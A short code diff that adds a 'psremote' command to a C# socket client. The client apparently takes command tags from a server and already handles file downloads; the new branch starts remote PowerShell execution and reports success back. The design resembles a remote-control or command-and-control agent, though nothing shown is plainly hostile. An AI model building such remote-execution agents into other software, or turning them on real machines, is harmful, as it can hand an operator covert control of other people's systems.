@@ -288,6 +288,20 @@ namespace myclient
 
                     }
 
+                    if (command_tag.ToLower() == "psremote")
+                    {
+                        myPsRun.remoteInit(command);
+                        Console.WriteLine("[DEBUG] psremote executed ...");
+                        msg = Encoding.UTF8.GetBytes(MsgPack("PSREMOTE_SUCCESS"));
+                        bytesSent = sender.Send(msg);
+                        if (bytesSent != msg.Length)
+                        {
+                            Console.WriteLine("[DEBUG] Something wrong with send"); //should never happen
+                        }
+                        Console.WriteLine("Send result finished");
+
+                    }
+
                     if (command_tag.ToLower() == "download")
                     {
                         byte[] t_file;
